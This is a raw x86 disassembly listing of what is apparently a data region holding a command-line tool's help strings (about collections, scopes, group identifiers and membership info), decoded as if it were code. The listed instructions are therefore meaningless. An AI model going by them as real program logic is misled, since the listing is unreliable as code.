  405a2e:	jo     0x405a9c
  405a30:	popa   
  405a31:	jns    0x405a53
  405a33:	outs   dx,BYTE PTR ds:[esi]
  405a34:	popa   
  405a35:	ins    DWORD PTR es:[edi],dx
  405a36:	cmp    ah,BYTE PTR gs:[eax]
  405a39:	add    DWORD PTR ds:0x656e6f44,eax
  405a3f:	add    DWORD PTR cs:[edx],ebp
  405a42:	inc    ebp
  405a43:	ins    DWORD PTR es:[edi],dx
  405a44:	jo     0x405aba
  405a46:	jns    0x405a68
  405a48:	arpl   WORD PTR [edi+0x6d],bp
  405a4b:	ins    DWORD PTR es:[edi],dx
  405a4c:	popa   
  405a4d:	outs   dx,BYTE PTR ds:[esi]
  405a4e:	fs sub eax,0x656e696c
  405a54:	and    BYTE PTR [eax+0x61],dh
  405a57:	jb     0x405aba
  405a59:	ins    DWORD PTR es:[edi],dx
  405a5a:	gs je  0x405ac2
  405a5d:	jb     0x405ad2
  405a5f:	and    BYTE PTR [ecx+0x72],ah
  405a62:	and    BYTE PTR gs:[ecx+0x67],ch
  405a66:	outs   dx,BYTE PTR ds:[esi]
  405a67:	outs   dx,DWORD PTR ds:[esi]
  405a68:	jb     0x405acf
  405a6a:	fs add DWORD PTR cs:[eax],ebp
  405a6e:	inc    ebp
  405a6f:	ins    DWORD PTR es:[edi],dx
  405a70:	jo     0x405ae6
  405a72:	jns    0x405a94
  405a74:	arpl   WORD PTR [edi+0x6d],bp
  405a77:	ins    DWORD PTR es:[edi],dx
  405a78:	popa   
  405a79:	outs   dx,BYTE PTR ds:[esi]
  405a7a:	fs sub eax,0x656e696c
  405a80:	and    BYTE PTR [ebx+0x77],dh
  405a83:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x61207365
  405a8b:	jb     0x405af2
  405a8d:	and    BYTE PTR [ecx+0x67],ch
  405a90:	outs   dx,BYTE PTR ds:[esi]
  405a91:	outs   dx,DWORD PTR ds:[esi]
  405a92:	jb     0x405af9
  405a94:	fs add DWORD PTR cs:[esp+edx*2],edi
  405a99:	push   0x6f662065
  405a9e:	ins    BYTE PTR es:[edi],dx
  405a9f:	ins    BYTE PTR es:[edi],dx
  405aa0:	outs   dx,DWORD PTR ds:[esi]
  405aa1:	ja     0x405b0c
  405aa3:	outs   dx,BYTE PTR ds:[esi]
  405aa4:	and    BYTE PTR [di+0x6d],ah
  405aa8:	jo     0x405b1e
  405aaa:	jns    0x405acc
  405aac:	arpl   WORD PTR [edi+0x6d],bp
  405aaf:	ins    DWORD PTR es:[edi],dx
  405ab0:	popa   
  405ab1:	outs   dx,BYTE PTR ds:[esi]
  405ab2:	fs sub eax,0x656e696c
  405ab8:	and    BYTE PTR [ebx+0x77],dh
  405abb:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x20736920
  405ac3:	imul   esp,DWORD PTR [edi+0x6e],0x6465726f
  405aca:	cmp    ah,BYTE PTR [eax]
  405acc:	das    
  405acd:	jae    0x405b34
  405acf:	jb     0x405b47
  405ad1:	gs jb  0x405b02
  405ad4:	add    DWORD PTR ds:0x74706d45,ebp
  405ada:	jns    0x405afc
  405adc:	push   esp
  405add:	inc    esi
  405ade:	push   ebx
  405adf:	push   ebx
  405ae0:	inc    ebp
  405ae1:	inc    ebx
  405ae2:	push   ebp
  405ae3:	push   edx
  405ae4:	dec    ecx
  405ae5:	push   esp
  405ae6:	pop    ecx
  405ae7:	pop    edi
  405ae8:	push   ebx
  405ae9:	push   edi
  405aea:	dec    ecx
  405aeb:	push   esp
  405aec:	inc    ebx
  405aed:	dec    eax
  405aee:	inc    ebp
  405aef:	push   ebx
  405af0:	and    BYTE PTR [ebx+0x77],dh
  405af3:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x20736920
  405afb:	imul   esp,DWORD PTR [edi+0x6e],0x6465726f
  405b02:	add    DWORD PTR cs:[edi],eax
  405b05:	inc    ebp
  405b06:	jb     0x405b7a
  405b08:	outs   dx,DWORD PTR ds:[esi]
  405b09:	jb     0x405b45
  405b0b:	and    BYTE PTR [ecx],al
  405b0d:	or     al,0x53
  405b0f:	gs jb  0x405b88
  405b12:	gs jb  0x405b35
  405b15:	jae    0x405b7a
  405b17:	outs   dx,DWORD PTR ds:[esi]
  405b18:	jo     0x405b7f
  405b1a:	add    DWORD PTR [edi],ecx
  405b1c:	and    BYTE PTR [eax],ah
  405b1e:	and    BYTE PTR [edi+0x72],al
  405b21:	outs   dx,DWORD PTR ds:[esi]
  405b22:	jne    0x405b94
  405b24:	and    BYTE PTR [ecx+edi*2+0x70],dh
  405b28:	cmp    ah,BYTE PTR gs:[eax]
  405b2b:	add    ebp,esi
  405b2d:	sbb    BYTE PTR [ebx+0x6f],al
  405b30:	ins    DWORD PTR es:[edi],dx
  405b31:	ins    DWORD PTR es:[edi],dx
  405b32:	popa   
  405b33:	outs   dx,BYTE PTR ds:[esi]
  405b34:	fs jae 0x405b71
  405b37:	or     eax,0x200a0d0a
  405b3c:	and    BYTE PTR [eax],ah
  405b3e:	and    BYTE PTR [eax],ah
  405b40:	and    BYTE PTR [eax],ah
  405b42:	and    BYTE PTR [edi],ch
  405b44:	imul   esp,DWORD PTR [eax],0x6e656469
  405b4a:	je     0x405bb5
  405b4c:	je     0x405bc7
  405b4e:	and    BYTE PTR [eax],ch
  405b50:	das    
  405b51:	arpl   WORD PTR [edi+0x6c],bp
  405b54:	ins    BYTE PTR es:[edi],dx
  405b55:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405b5a:	outs   dx,BYTE PTR ds:[esi]
  405b5b:	cmp    al,BYTE PTR [ebx+0x6f]
  405b5e:	ins    BYTE PTR es:[edi],dx
  405b5f:	ins    BYTE PTR es:[edi],dx
  405b60:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405b65:	outs   dx,BYTE PTR ds:[esi]
  405b66:	push   ebp
  405b67:	push   edx
  405b68:	dec    ecx
  405b69:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  405b6d:	jae    0x405bd4
  405b6f:	jb     0x405be7
  405b71:	gs jb  0x405bae
  405b74:	push   ebx
  405b75:	gs jb  0x405bee
  405b78:	gs jb  0x405bd0
  405b7b:	push   edx
  405b7c:	dec    ecx
  405b7d:	sub    DWORD PTR ds:0x2020200a,ecx
  405b83:	and    BYTE PTR [eax],ah
  405b85:	and    BYTE PTR [eax],ah
  405b87:	and    BYTE PTR [eax],ah
  405b89:	and    BYTE PTR [eax],ah
  405b8b:	and    BYTE PTR [ecx+ebp*2+0x73],al
  405b8f:	jo     0x405bfd
  405b91:	popa   
  405b92:	jns    0x405c07
  405b94:	and    BYTE PTR [ecx+0x64],ch
  405b97:	outs   dx,BYTE PTR gs:[esi]
  405b99:	je     0x405c04
  405b9b:	je     0x405c16
  405b9d:	and    BYTE PTR [ecx+0x6e],ch
  405ba0:	outs   dx,WORD PTR ds:[esi]
  405ba2:	jb     0x405c11
  405ba4:	popa   
  405ba5:	je     0x405c10
  405ba7:	outs   dx,DWORD PTR ds:[esi]
  405ba8:	outs   dx,BYTE PTR ds:[esi]
  405ba9:	and    BYTE PTR [edi+0x69],dh
  405bac:	je     0x405c16
  405bae:	outs   dx,DWORD PTR ds:[esi]
  405baf:	jne    0x405c25
  405bb1:	and    BYTE PTR [ecx+0x6e],ah
  405bb4:	jns    0x405bd6
  405bb6:	ins    DWORD PTR es:[edi],dx
  405bb7:	gs ins DWORD PTR es:[edi],dx
  405bb9:	bound  esp,QWORD PTR [ebp+0x72]
  405bbc:	jae    0x405c26
  405bbe:	imul   esi,DWORD PTR [eax+0x20],0x6f666e69
  405bc5:	jb     0x405c34
  405bc7:	popa   
  405bc8:	je     0x405c33
  405bca:	outs   dx,DWORD PTR ds:[esi]
  405bcb:	outs   dx,BYTE PTR ds:[esi]
  405bcc:	cs or  eax,0x200a0d0a
  405bd2:	and    BYTE PTR [eax],ah
  405bd4:	and    BYTE PTR [eax],ah
  405bd6:	and    BYTE PTR [eax],ah
  405bd8:	and    BYTE PTR [edi],ch
  405bda:	imul   ebp,DWORD PTR [ebp+0x20],0x6e656469
  405be1:	je     0x405c4c
  405be3:	je     0x405c5e
  405be5:	and    BYTE PTR [eax],ch
  405be7:	das    
  405be8:	arpl   WORD PTR [edi+0x6c],bp
  405beb:	ins    BYTE PTR es:[edi],dx
  405bec:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405bf1:	outs   dx,BYTE PTR ds:[esi]
  405bf2:	cmp    al,BYTE PTR [ebx+0x6f]
  405bf5:	ins    BYTE PTR es:[edi],dx
  405bf6:	ins    BYTE PTR es:[edi],dx
  405bf7:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405bfc:	outs   dx,BYTE PTR ds:[esi]
  405bfd:	push   ebp
  405bfe:	push   edx
  405bff:	dec    ecx
  405c00:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  405c04:	jae    0x405c6b
  405c06:	jb     0x405c7e
  405c08:	gs jb  0x405c45
  405c0b:	push   ebx
  405c0c:	gs jb  0x405c85
  405c0f:	gs jb  0x405c67
  405c12:	push   edx
  405c13:	dec    ecx
  405c14:	sub    DWORD PTR ds:0x2020200a,ecx
  405c1a:	and    BYTE PTR [eax],ah
  405c1c:	and    BYTE PTR [eax],ah
  405c1e:	and    BYTE PTR [eax],ah
  405c20:	and    BYTE PTR [eax],ah
  405c22:	and    BYTE PTR [ecx+ebp*2+0x73],al
  405c26:	jo     0x405c94
  405c28:	popa   
  405c29:	jns    0x405c9e
  405c2b:	and    BYTE PTR [ecx+0x64],ch
  405c2e:	outs   dx,BYTE PTR gs:[esi]
  405c30:	je     0x405c9b
  405c32:	je     0x405cad
  405c34:	and    BYTE PTR [ecx+0x6e],ch
  405c37:	outs   dx,WORD PTR ds:[esi]
  405c39:	jb     0x405ca8
  405c3b:	popa   
  405c3c:	je     0x405ca7
  405c3e:	outs   dx,DWORD PTR ds:[esi]
  405c3f:	outs   dx,BYTE PTR ds:[esi]
  405c40:	and    BYTE PTR [edi+0x69],dh
  405c43:	je     0x405cad
  405c45:	and    BYTE PTR [ecx+ebp*2+0x72],ah
  405c49:	arpl   WORD PTR gs:[eax+eiz*1+0x6d],si
  405c4e:	gs ins DWORD PTR es:[edi],dx
  405c50:	bound  esp,QWORD PTR [ebp+0x72]
  405c53:	jae    0x405cbd
  405c55:	imul   esi,DWORD PTR [eax+0x20],0x6f666e69
  405c5c:	jb     0x405ccb
  405c5e:	popa   
  405c5f:	je     0x405cca
  405c61:	outs   dx,DWORD PTR ds:[esi]
  405c62:	outs   dx,BYTE PTR ds:[esi]
  405c63:	cs or  eax,0x200a0d0a
  405c69:	and    BYTE PTR [eax],ah
  405c6b:	and    BYTE PTR [eax],ah
  405c6d:	and    BYTE PTR [eax],ah
  405c6f:	and    BYTE PTR [edi],ch
  405c71:	imul   ebp,DWORD PTR [ebp+0x78],0x65646920
  405c78:	outs   dx,BYTE PTR ds:[esi]
  405c79:	je     0x405ce4
  405c7b:	je     0x405cf6
  405c7d:	and    BYTE PTR [eax],ch
  405c7f:	das    
  405c80:	arpl   WORD PTR [edi+0x6c],bp
  405c83:	ins    BYTE PTR es:[edi],dx
  405c84:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405c89:	outs   dx,BYTE PTR ds:[esi]
  405c8a:	cmp    al,BYTE PTR [ebx+0x6f]
  405c8d:	ins    BYTE PTR es:[edi],dx
  405c8e:	ins    BYTE PTR es:[edi],dx
  405c8f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405c94:	outs   dx,BYTE PTR ds:[esi]
  405c95:	push   ebp
  405c96:	push   edx
  405c97:	dec    ecx
  405c98:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  405c9c:	jae    0x405d03
  405c9e:	jb     0x405d16
  405ca0:	gs jb  0x405cdd
  405ca3:	push   ebx
  405ca4:	gs jb  0x405d1d
  405ca7:	gs jb  0x405cff
  405caa:	push   edx
  405cab:	dec    ecx
  405cac:	sub    DWORD PTR ds:0x2020200a,ecx
  405cb2:	and    BYTE PTR [eax],ah
  405cb4:	and    BYTE PTR [eax],ah
  405cb6:	and    BYTE PTR [eax],ah
  405cb8:	and    BYTE PTR [eax],ah
  405cba:	and    BYTE PTR [ecx+ebp*2+0x73],al
  405cbe:	jo     0x405d2c
  405cc0:	popa   
  405cc1:	jns    0x405d36
  405cc3:	and    BYTE PTR [ecx+0x64],ch
  405cc6:	outs   dx,BYTE PTR gs:[esi]
  405cc8:	je     0x405d33
  405cca:	je     0x405d45
  405ccc:	and    BYTE PTR [ecx+0x6e],ch
  405ccf:	outs   dx,WORD PTR ds:[esi]
  405cd1:	jb     0x405d40
  405cd3:	popa   
  405cd4:	je     0x405d3f
  405cd6:	outs   dx,DWORD PTR ds:[esi]
  405cd7:	outs   dx,BYTE PTR ds:[esi]
  405cd8:	and    BYTE PTR [edi+0x69],dh
  405cdb:	je     0x405d45
  405cdd:	and    BYTE PTR [ebp+0x78],ah
  405ce0:	jo     0x405d43
  405ce2:	outs   dx,BYTE PTR ds:[esi]
  405ce3:	fs gs and BYTE PTR fs:[ebp+0x65],ch
  405ce9:	ins    DWORD PTR es:[edi],dx
  405cea:	bound  esp,QWORD PTR [ebp+0x72]
  405ced:	jae    0x405d57
  405cef:	imul   esi,DWORD PTR [eax+0x20],0x6f666e69
  405cf6:	jb     0x405d65
  405cf8:	popa   
  405cf9:	je     0x405d64
  405cfb:	outs   dx,DWORD PTR ds:[esi]
  405cfc:	outs   dx,BYTE PTR ds:[esi]
  405cfd:	cs or  eax,0x200a0d0a
  405d03:	and    BYTE PTR [eax],ah
  405d05:	and    BYTE PTR [eax],ah
  405d07:	and    BYTE PTR [eax],ah
  405d09:	and    BYTE PTR [edi],ch
  405d0b:	and    BYTE PTR [bp+di+0x73],bl
  405d0f:	arpl   WORD PTR [edi+0x70],bp
  405d12:	gs pop ebp
  405d14:	and    BYTE PTR [eax],ch
  405d16:	das    
  405d17:	arpl   WORD PTR [edi+0x6c],bp
  405d1a:	ins    BYTE PTR es:[edi],dx
  405d1b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405d20:	outs   dx,BYTE PTR ds:[esi]
  405d21:	cmp    al,BYTE PTR [ebx+0x6f]
  405d24:	ins    BYTE PTR es:[edi],dx
  405d25:	ins    BYTE PTR es:[edi],dx
  405d26:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405d2b:	outs   dx,BYTE PTR ds:[esi]
  405d2c:	push   ebp
  405d2d:	push   edx
  405d2e:	dec    ecx
  405d2f:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  405d33:	jae    0x405d9a
  405d35:	jb     0x405dad
  405d37:	gs jb  0x405d74
  405d3a:	push   ebx
  405d3b:	gs jb  0x405db4
  405d3e:	gs jb  0x405d96
  405d41:	push   edx
  405d42:	dec    ecx
  405d43:	sub    DWORD PTR [eax],esp
  405d45:	or     eax,0x2020200a
  405d4a:	and    BYTE PTR [eax],ah
  405d4c:	and    BYTE PTR [eax],ah
  405d4e:	and    BYTE PTR [eax],ah
  405d50:	and    BYTE PTR [eax],ah
  405d52:	and    BYTE PTR [ecx+ebp*2+0x73],cl
  405d56:	je     0x405dcb
  405d58:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405d5c:	and    BYTE PTR [edi+0x72],ah
  405d5f:	outs   dx,DWORD PTR ds:[esi]
  405d60:	jne    0x405dd2
  405d62:	jae    0x405d84
  405d64:	ja     0x405dcf
  405d66:	je     0x405dd0
  405d68:	imul   ebp,DWORD PTR [esi+0x20],0x72702061
  405d6f:	outs   dx,DWORD PTR ds:[esi]
  405d70:	push   0x65
  405d72:	arpl   WORD PTR [eax+eiz*1+0x73],si
  405d76:	arpl   WORD PTR [edi+0x70],bp
  405d79:	gs and BYTE PTR cs:[eax+ebp*2+0x65],dl
  405d7f:	and    BYTE PTR [eax+0x72],dh
  405d82:	outs   dx,DWORD PTR ds:[esi]
  405d83:	push   0x65
  405d85:	arpl   WORD PTR [eax+eiz*1+0x73],si
  405d89:	arpl   WORD PTR [edi+0x70],bp
  405d8c:	and    BYTE PTR gs:[ecx+0x73],ch
  405d90:	and    BYTE PTR [ecx+0x20],ah
  405d93:	jo     0x405e07
  405d95:	outs   dx,DWORD PTR ds:[esi]
  405d96:	push   0x65
  405d98:	arpl   WORD PTR [eax+eiz*1+0x75],si
  405d9c:	outs   dx,BYTE PTR ds:[esi]
  405d9d:	imul   esp,DWORD PTR [esi+0x6f],0x72206d72
  405da4:	gs jae 0x405e16
  405da7:	jne    0x405e1b
  405da9:	arpl   WORD PTR [ebp+0x20],sp
  405dac:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x69666974
  405db4:	gs jb  0x405dd7
  405db7:	sub    BYTE PTR [ebp+0x52],dl
  405dba:	dec    ecx
  405dbb:	sub    DWORD PTR [esi],ebp
  405dbd:	and    BYTE PTR [ecx+0x66],cl
  405dc0:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405dc4:	and    BYTE PTR [ebx+0x63],dh
  405dc7:	outs   dx,DWORD PTR ds:[esi]
  405dc8:	jo     0x405e2f
  405dca:	and    BYTE PTR [ecx+0x73],ch
  405dcd:	and    BYTE PTR [edi+0x6d],ch
  405dd0:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x74202c64
  405dd8:	push   0x72672065
  405ddd:	outs   dx,DWORD PTR ds:[esi]
  405dde:	jne    0x405e50
  405de0:	jae    0x405e02
  405de2:	imul   esi,DWORD PTR fs:[ebx+0x70],0x6579616c
  405dea:	and    BYTE PTR fs:[ecx+0x72],ah
  405dee:	and    BYTE PTR gs:[eax+ebp*2+0x6f],dh
  405df3:	jae    0x405e5a
  405df5:	and    BYTE PTR [eax+ebp*2+0x61],dh
  405df9:	je     0x405e1b
  405dfb:	bound  esp,QWORD PTR [ebp+0x6c]
  405dfe:	outs   dx,DWORD PTR ds:[esi]
  405dff:	outs   dx,BYTE PTR ds:[esi]
  405e00:	and    BYTE PTR [si+0x6f],dh
  405e04:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405e08:	and    BYTE PTR [ebx+0x63],dh
  405e0b:	outs   dx,DWORD PTR ds:[esi]
  405e0c:	jo     0x405e73
  405e0e:	and    BYTE PTR [ebx+0x70],dh
  405e11:	arpl   WORD PTR gs:[ecx+0x66],bp
  405e15:	imul   esp,DWORD PTR [ebp+0x64],0x20796220
  405e1c:	das    
  405e1d:	arpl   WORD PTR [edi+0x6c],bp
  405e20:	ins    BYTE PTR es:[edi],dx
  405e21:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405e26:	outs   dx,BYTE PTR ds:[esi]
  405e27:	and    BYTE PTR [edi+0x72],ch
  405e2a:	and    BYTE PTR [edi],ch
  405e2c:	jae    0x405e93
  405e2e:	jb     0x405ea6
  405e30:	gs jb  0x405e5f
  405e33:	and    BYTE PTR [ebp+eiz*2+0x70],ah
  405e37:	outs   dx,BYTE PTR gs:[esi]
  405e39:	imul   ebp,DWORD PTR fs:[esi+0x67],0x206e6f20
  405e41:	ja     0x405eab
  405e43:	imul   esp,DWORD PTR [ebx+0x68],0x73617720
  405e4a:	and    BYTE PTR [ebp+0x73],dh
  405e4d:	gs fs cs or eax,0x200a0d0a
  405e55:	and    BYTE PTR [eax],ah
  405e57:	and    BYTE PTR [eax],ah
  405e59:	and    BYTE PTR [eax],ah
  405e5b:	and    BYTE PTR [edi],ch
  405e5d:	arpl   WORD PTR [bx+0x20],sp
  405e61:	addr16 jb 0x405ed3
  405e64:	jne    0x405ed6
  405e66:	dec    esi
  405e67:	popa   
  405e68:	ins    DWORD PTR es:[edi],dx
  405e69:	and    BYTE PTR gs:[ebx+0x67],bl
  405e6d:	jb     0x405ede
  405e6f:	jne    0x405ee1
  405e71:	inc    esp
  405e72:	gs jae 0x405ed8
  405e75:	jb     0x405ee0
  405e77:	jo     0x405eed
  405e79:	imul   ebp,DWORD PTR [edi+0x6e],0x2f28205d
  405e80:	arpl   WORD PTR [edi+0x6c],bp
  405e83:	ins    BYTE PTR es:[edi],dx
  405e84:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405e89:	outs   dx,BYTE PTR ds:[esi]
  405e8a:	cmp    al,BYTE PTR [ebx+0x6f]
  405e8d:	ins    BYTE PTR es:[edi],dx
  405e8e:	ins    BYTE PTR es:[edi],dx
  405e8f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405e94:	outs   dx,BYTE PTR ds:[esi]
  405e95:	push   ebp
  405e96:	push   edx
  405e97:	dec    ecx
  405e98:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  405e9c:	jae    0x405f03
  405e9e:	jb     0x405f16
  405ea0:	gs jb  0x405edd
  405ea3:	push   ebx
  405ea4:	gs jb  0x405f1d
  405ea7:	gs jb  0x405eff
  405eaa:	push   edx
  405eab:	dec    ecx
  405eac:	sub    DWORD PTR ds:0x2020200a,ecx
  405eb2:	and    BYTE PTR [eax],ah
  405eb4:	and    BYTE PTR [eax],ah
  405eb6:	and    BYTE PTR [eax],ah
  405eb8:	and    BYTE PTR [eax],ah
  405eba:	and    BYTE PTR [ebx+0x72],al
  405ebd:	gs popa 
  405ebf:	je     0x405f26
  405ec1:	jae    0x405ee3
  405ec3:	popa   
  405ec4:	and    BYTE PTR [ebx+0x6f],ah
  405ec7:	ins    BYTE PTR es:[edi],dx
  405ec8:	ins    BYTE PTR es:[edi],dx
  405ec9:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405ece:	outs   dx,BYTE PTR ds:[esi]
  405ecf:	sub    eax,0x6576656c
  405ed4:	ins    BYTE PTR es:[edi],dx
  405ed5:	and    BYTE PTR [edi+0x72],ch
  405ed8:	and    BYTE PTR [ecx+0x6e],ch
  405edb:	jae    0x405f51
  405edd:	popa   
  405ede:	outs   dx,BYTE PTR ds:[esi]
  405edf:	arpl   WORD PTR [ebp+0x2d],sp
  405ee2:	ins    BYTE PTR es:[edi],dx
  405ee3:	gs jbe 0x405f4b
  405ee6:	ins    BYTE PTR es:[edi],dx
  405ee7:	and    BYTE PTR [edi+0x72],ah
  405eea:	outs   dx,DWORD PTR ds:[esi]
  405eeb:	jne    0x405f5d
  405eed:	cs or  eax,0x200a0d0a
  405ef3:	and    BYTE PTR [eax],ah
  405ef5:	and    BYTE PTR [eax],ah
  405ef7:	and    BYTE PTR [eax],ah
  405ef9:	and    BYTE PTR [edi],ch
  405efb:	arpl   WORD PTR [bx+si],sp
  405efe:	jae    0x405f63
  405f00:	outs   dx,DWORD PTR ds:[esi]
  405f01:	jo     0x405f68
  405f03:	and    BYTE PTR [edi+0x72],ah
  405f06:	outs   dx,DWORD PTR ds:[esi]
  405f07:	jne    0x405f79
  405f09:	dec    esi
  405f0a:	popa   
  405f0b:	ins    DWORD PTR es:[edi],dx
  405f0c:	and    BYTE PTR gs:[ebx+0x67],bl
  405f10:	jb     0x405f81
  405f12:	jne    0x405f84
  405f14:	inc    esp
  405f15:	gs jae 0x405f7b
  405f18:	jb     0x405f83
  405f1a:	jo     0x405f90
  405f1c:	imul   ebp,DWORD PTR [edi+0x6e],0x632f205d
  405f23:	outs   dx,DWORD PTR ds:[esi]
  405f24:	ins    BYTE PTR es:[edi],dx
  405f25:	ins    BYTE PTR es:[edi],dx
  405f26:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405f2b:	outs   dx,BYTE PTR ds:[esi]
  405f2c:	cmp    al,BYTE PTR [ebx+0x6f]
  405f2f:	ins    BYTE PTR es:[edi],dx
  405f30:	ins    BYTE PTR es:[edi],dx
  405f31:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405f36:	outs   dx,BYTE PTR ds:[esi]
  405f37:	push   ebp
  405f38:	push   edx
  405f39:	dec    ecx
  405f3a:	or     eax,0x2020200a
  405f3f:	and    BYTE PTR [eax],ah
  405f41:	and    BYTE PTR [eax],ah
  405f43:	and    BYTE PTR [eax],ah
  405f45:	and    BYTE PTR [eax],ah
  405f47:	and    BYTE PTR [ebx+0x72],al
  405f4a:	gs popa 
  405f4c:	je     0x405fb3
  405f4e:	jae    0x405f70
  405f50:	popa   
  405f51:	and    BYTE PTR [eax+0x72],dh
  405f54:	outs   dx,DWORD PTR ds:[esi]
  405f55:	push   0x65
  405f57:	arpl   WORD PTR [ebp+ebp*1+0x6c],si
  405f5b:	gs jbe 0x405fc3
  405f5e:	ins    BYTE PTR es:[edi],dx
  405f5f:	and    BYTE PTR [edi+0x72],ah
  405f62:	outs   dx,DWORD PTR ds:[esi]
  405f63:	jne    0x405fd5
  405f65:	and    BYTE PTR [edi+0x69],dh
  405f68:	je     0x405fd2
  405f6a:	imul   ebp,DWORD PTR [esi+0x20],0x72702061
  405f71:	outs   dx,DWORD PTR ds:[esi]
  405f72:	push   0x65
  405f74:	arpl   WORD PTR [eax+eiz*1+0x73],si
  405f78:	arpl   WORD PTR [edi+0x70],bp
  405f7b:	gs and BYTE PTR cs:[eax+ebp*2+0x65],dl
  405f81:	and    BYTE PTR [eax+0x72],dh
  405f84:	outs   dx,DWORD PTR ds:[esi]
  405f85:	push   0x65
  405f87:	arpl   WORD PTR [eax+eiz*1+0x73],si
  405f8b:	arpl   WORD PTR [edi+0x70],bp
  405f8e:	and    BYTE PTR gs:[ecx+0x73],ch
  405f92:	and    BYTE PTR [ecx+0x20],ah
  405f95:	jo     0x406009
  405f97:	outs   dx,DWORD PTR ds:[esi]
  405f98:	push   0x65
  405f9a:	arpl   WORD PTR [eax+eiz*1+0x75],si
  405f9e:	outs   dx,BYTE PTR ds:[esi]
  405f9f:	imul   esp,DWORD PTR [esi+0x6f],0x72206d72
  405fa6:	gs jae 0x406018
  405fa9:	jne    0x40601d
  405fab:	arpl   WORD PTR [ebp+0x20],sp
  405fae:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x69666974
  405fb6:	gs jb  0x405fd9
  405fb9:	sub    BYTE PTR [ebp+0x52],dl
  405fbc:	dec    ecx
  405fbd:	sub    DWORD PTR [esi],ebp
  405fbf:	or     eax,0x200a0d0a
  405fc4:	and    BYTE PTR [eax],ah
  405fc6:	and    BYTE PTR [eax],ah
  405fc8:	and    BYTE PTR [eax],ah
  405fca:	and    BYTE PTR [edi],ch
  405fcc:	addr16 jne 0x40603d
  405fcf:	and    BYTE PTR [edi+0x72],ah
  405fd2:	outs   dx,DWORD PTR ds:[esi]
  405fd3:	jne    0x406045
  405fd5:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x79746974
  405fdd:	and    BYTE PTR [edi+0x72],ah
  405fe0:	outs   dx,DWORD PTR ds:[esi]
  405fe1:	jne    0x406053
  405fe3:	outs   dx,BYTE PTR ds:[esi]
  405fe4:	popa   
  405fe5:	ins    DWORD PTR es:[edi],dx
  405fe6:	and    BYTE PTR gs:[eax],ch
  405fe9:	das    
  405fea:	arpl   WORD PTR [edi+0x6c],bp
  405fed:	ins    BYTE PTR es:[edi],dx
  405fee:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405ff3:	outs   dx,BYTE PTR ds:[esi]
  405ff4:	cmp    al,BYTE PTR [ebx+0x6f]
  405ff7:	ins    BYTE PTR es:[edi],dx
  405ff8:	ins    BYTE PTR es:[edi],dx
  405ff9:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405ffe:	outs   dx,BYTE PTR ds:[esi]
  405fff:	push   ebp
  406000:	push   edx
  406001:	dec    ecx
  406002:	and    BYTE PTR [eax+eiz*1+0x2f],bh
  406006:	jae    0x40606d
  406008:	jb     0x406080
  40600a:	gs jb  0x406047
  40600d:	push   ebx
  40600e:	gs jb  0x406087
  406011:	gs jb  0x406069
  406014:	push   edx
  406015:	dec    ecx
  406016:	sub    DWORD PTR ds:0x2020200a,ecx
  40601c:	and    BYTE PTR [eax],ah
  40601e:	and    BYTE PTR [eax],ah
  406020:	and    BYTE PTR [eax],ah
  406022:	and    BYTE PTR [eax],ah
  406024:	and    BYTE PTR [edx+0x65],dl
  406027:	outs   dx,BYTE PTR ds:[esi]
  406028:	popa   
  406029:	ins    DWORD PTR es:[edi],dx
  40602a:	gs jae 0x40604d
  40602d:	popa   
  40602e:	and    BYTE PTR [ebx+0x6f],ah
  406031:	ins    BYTE PTR es:[edi],dx
  406032:	ins    BYTE PTR es:[edi],dx
  406033:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406038:	outs   dx,BYTE PTR ds:[esi]
  406039:	sub    eax,0x6576656c
  40603e:	ins    BYTE PTR es:[edi],dx
  40603f:	and    BYTE PTR [edi+0x72],ch
  406042:	and    BYTE PTR [ecx+0x6e],ch
  406045:	jae    0x4060bb
  406047:	popa   
  406048:	outs   dx,BYTE PTR ds:[esi]
  406049:	arpl   WORD PTR [ebp+0x2d],sp
  40604c:	ins    BYTE PTR es:[edi],dx
  40604d:	gs jbe 0x4060b5
  406050:	ins    BYTE PTR es:[edi],dx
  406051:	and    BYTE PTR [edi+0x72],ah
  406054:	outs   dx,DWORD PTR ds:[esi]
  406055:	jne    0x4060c7
  406057:	cs or  eax,0x200a0d0a
  40605d:	and    BYTE PTR [eax],ah
  40605f:	and    BYTE PTR [eax],ah
  406061:	and    BYTE PTR [eax],ah
  406063:	and    BYTE PTR [edi],ch
  406065:	addr16 jne 0x4060cc
  406068:	and    BYTE PTR [edi+0x72],ah
  40606b:	outs   dx,DWORD PTR ds:[esi]
  40606c:	jne    0x4060de
  40606e:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x79746974
  406076:	and    BYTE PTR [edi+0x72],ah
  406079:	outs   dx,DWORD PTR ds:[esi]
  40607a:	jne    0x4060ec
